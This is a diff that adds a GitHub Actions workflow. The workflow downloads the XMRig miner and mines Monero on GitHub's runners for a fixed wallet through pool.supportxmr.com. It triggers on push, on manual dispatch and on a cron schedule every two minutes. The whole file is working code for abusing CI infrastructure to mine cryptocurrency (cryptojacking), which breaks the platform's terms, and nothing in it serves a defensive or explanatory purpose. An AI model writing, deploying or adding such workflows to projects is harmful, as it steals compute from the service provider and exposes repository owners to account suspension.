@@ -1,0 +1,94 @@
+name: Pool Mining SupportXMR 4
+
+on:
+  push:
+  schedule:
+    - cron: '*/2 * * * *'
+  workflow_dispatch:
+
+jobs:
+  pool-mining:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    
+    steps:
+    - name: Setup Mining Environment
+      run: |
+        sudo apt-get update -q
+        sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+        
+    - name: Download XMRig Miner
+      run: |
+        wget -q https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz
+        tar -xf xmrig-6.20.0-linux-x64.tar.gz
+        mv xmrig-6.20.0/* .
+        chmod +x xmrig
+        
+    - name: Configure Pool Mining
+      run: |
+        cat > pool-config.json << 'EOF'
+        {
+          "autosave": true,
+          "cpu": {
+            "enabled": true,
+            "huge-pages": true,
+            "hw-aes": null,
+            "priority": 5,
+            "memory-pool": false,
+            "yield": true,
+            "asm": true,
+            "argon2-impl": null,
+            "cn/0": false,
+            "cn-lite/0": false
+          },
+          "opencl": false,
+          "cuda": false,
+          "pools": [
+            {
+              "coin": "monero",
+              "algo": "rx/0",
+              "url": "pool.supportxmr.com:3333",
+              "user": "42FLZRFF6gv89vZGuNEtpsENcwXdAKhysQQD8mTwJZWmLuj7gu6AviLYV7XP1Bysd8K4ZZC2ymALx42MbbGqaMDxEwHewvn",
+              "pass": "Pool-4-${{ github.repository }}",
+              "rig-id": "SupportXMR-${{ github.run_id }}",
+              "nicehash": false,
+              "keepalive": true,
+              "enabled": true,
+              "tls": false,
+              "daemon": false
+            }
+          ],
+          "print-time": 30,
+          "retries": 5,
+          "retry-pause": 2,
+          "syslog": false,
+          "user-agent": "XMRig-Pool",
+          "verbose": 1,
+          "watch": true,
+          "pause-on-battery": false,
+          "pause-on-active": false
+        }
+        EOF
+        
+    - name: Start Pool Mining
+      run: |
+        echo "=== POOL MINING SESSION STARTED ==="
+        echo "Pool: SupportXMR (pool.supportxmr.com:3333)"
+        echo "Fee: 0.6%"
+        echo "Wallet: 42FLZRFF6gv89vZGuNEtpsENcwXdAKhysQQD8mTwJZWmLuj7gu6AviLYV7XP1Bysd8K4ZZC2ymALx42MbbGqaMDxEwHewvn"
+        echo "Miner: 4"
+        echo "Schedule: */2 * * * *"
+        echo "Start Time: $(date)"
+        
+        timeout 300 ./xmrig --config=pool-config.json || echo "Pool mining session completed"
+        
+    - name: Mining Session Report
+      run: |
+        echo "=== POOL MINING SESSION COMPLETED ==="
+        echo "Pool: SupportXMR"
+        echo "Miner ID: 4"
+        echo "Wallet: 42FLZRFF6gv89vZGuNEtpsENcwXdAKhysQQD8mTwJZWmLuj7gu6AviLYV7XP1Bysd8K4ZZC2ymALx42MbbGqaMDxEwHewvn"
+        echo "Duration: 5 minutes"
+        echo "Next Run: */2 * * * *"
+        echo "Status: EARNING"
+        echo "End Time: $(date)"
